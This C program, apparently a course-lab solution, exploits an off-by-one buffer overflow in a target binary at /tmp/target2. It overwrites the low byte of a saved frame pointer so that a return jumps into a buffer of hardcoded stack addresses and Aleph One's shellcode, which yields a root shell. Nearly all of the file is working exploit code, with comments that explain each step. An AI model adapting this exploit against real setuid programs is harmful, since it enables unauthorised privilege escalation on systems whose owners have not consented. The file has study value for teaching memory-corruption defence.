#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define EGG_SIZE 208 /* size of exploit string */

/* 
 * Main idea of exploit:
 *     In this exploit we have a buffer big enough 
 *     to hold our shellcode and we can only overwrite
 *     the LSB of the saved ebp in the bar stack frame. 
 *     The main idea is to change this byte so that the 
 *     saved ebp now points to an address inside our buffer 
 *     where the poisonous eip (address of shellcode) is*.
 *     The prologue for bar will restore the ebp to this 
 *     fake ebp and the prologue for foo will pop off our 
 *     poisonous eip to the eip register. The shellcode 
 *     then executes and badabing! we get root shell.
 */

/* 
   Useful addresses to know to understand the exploit: 
   
   During execution:

   foo stack frame:
      $fp = 0xBFFFFD68
   bar stack frame:
      $fp = 0xBFFFFD58
   nstrcpy stack frame:
      $fp = 0xBFFFFC68
   
   start address of buf local var in bar function: 0xBFFFFC90 
*/

int main (void)
{
  char *args[3];
  char *env[1];
  long buffAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  buffAddr = 0xBFFFFC90; /* start address of buf in target2.c:bar */

  /* First, fill the exploit string with the start address of the buf
     in bar. We will set it up such that at some point immediately 
     before a 'ret' instruction our stack pointer will point inside 
     buf and hence the 'ret' instruction will pop off and insert 
     0xBFFFFC90 (the start address of buf) into eip. At that point 
     the shellcode will begin executing and we are done. */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = buffAddr;

  /* The check 'i <= len' inside the for loop in nstrcpy allows us
     to overwrite the LSB of the saved ebp for the foo stack frame,
     which is 0xBFFFFD68. This differs only in the LSB with 0xBFFFFD50
     which is an address inside buf. If we overwrite the LSB of the 
     saved ebp for the foo stack frame to 0x50 then the 'leave' 
     instruction for the bar function call will restore ebp to 
     0xBFFFFD50. Next, the 'leave' instruction for the foo function 
     call will set esp to 0xBFFFFD50, pop off 4 bytes to restore a junk
     ebp and leave esp equal to 0xBFFFFD50. Since the address 
     0xBFFFFD50 is inside buf, it contains the value 0xBFFFFC90 (the 
     start of the buffer) and hence the 'ret' call immediately after 
     will set eip equal to 0xBFFFFC90. 

     Notice EGG_SIZE - 8 is the 201 byte of the exploit string. This
     is exactly the byte that will overwrite the LSB of the saved ebp
     for foo stack frame. */
  egg[EGG_SIZE - 8] = 0x50; 

  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string */
  
  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve (TARGET, args, env))
    fprintf (stderr, "execve failed.\n");

  return 0;
}
